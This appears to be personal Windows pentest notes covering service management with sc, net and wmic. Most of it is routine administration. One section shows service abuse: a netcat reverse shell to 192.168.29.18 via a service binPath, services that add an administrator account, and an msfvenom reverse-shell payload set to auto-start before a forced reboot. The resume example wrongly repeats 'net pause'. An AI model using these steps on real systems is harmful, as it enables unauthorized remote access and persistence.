
### Quering Services

*   Display inforamtionabout a specified service

```powershell
sc query
```

*   Display extended information about a service

```powershell
sc queryex type=service
```

*    Display services of type __'service'__

```powershell
sc query type=service
```    

*   Find specific service state

```powershell
sc query | find "STATE"
```

*   Find a specific service by name

```powershell
sc query | find "Server"
```

*    Query a specific service

```powershell
sc query <Service_name>
```


### Service COnfigguration

*   Display the configuration of a service

```powershell
sc qc <Service_Name>
```

*   Stop a service

```powershell
sc stop <Service_Name>
```

*   Start a service

```powershell
sc start <Service_name>
```

*   Pause a Service

```powershell
sc pause <Service_name>
```

* Resume a paused service
  
```powershell
sc continue <Service_name>
```

*   Configure service startup and login accounts

```powershell
sc config <Service_name>
```

### Creating and Managing Services

*   Create a new Service

```powershell
sc create nc binPath= "C:\Windows\System32\nc64.exe"
```

* Query the configuration of a created service

```powershell
sc qc nc
```

*   Query the status of a created service

```powershell
sc query nc
```

* Start the created service

```powershell
sc start nc
```

*   Delete a service

```powershell
sc delete nc
```

* configure a service to run a specific command
  
```powershell
sc config nc binPath= "C:\Windows\System32\nc64.exe 192.168.29.18 4444 -e cmd.exe"
```

*   Create a service to sned ICMP packets

```powershell
sc create pingme binPath= "ping 192.168.29.18"
```

*   Create a User creation Service

```powershell
sc create useradd binPath= "net user u1 DevNull@123 /add"
```

*   Configure a service to add a user to administrators group

```powershell
sc config useradd binPath= "net localgroup administrators u1 /add"
```

### Exploitation Example

*   Generate a reverse shell executable using ```msfvenom```

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.29.18 LPORT=4455 -f exe > shell.exe
```

*   Configure a service to execute the shell

```powershell
sc create nc binPath= "C:\Windows\Temp\shell.exe"
```

```powershell
sc config nc start= auto
```

*   ```auto``` - Automatic startup
*   ```demand``` - Manual Startup
*   ```disabled``` - Disabled

* Restart the system immediately

```powershell
shutdown /r /t 0 /f
```

### Service Management using ```net```

*   start a service using ```net```

```powershell
net start <Service_name>
```

*   Stop a service using ```net```

```powershell
net stop <Service_name>
```

*   Pause a service using ```net```


```powershell
net pause <Service_Name>
```

*   Resume a paused service using ```net```

```powershell
net pause <Service_name>
```

### Using ```wmic``` to manage service

*   List all services with details

```powershell
wmic service get name,displayname,pathname,startmode
```

*   List all auto-start services

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
```

*   List all auto-start service excluding those in ```C:\Windows```

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
```


### Additional Resources

*   [service security editor](https://coretechnologies.com/products/ServiceSecurityEditor)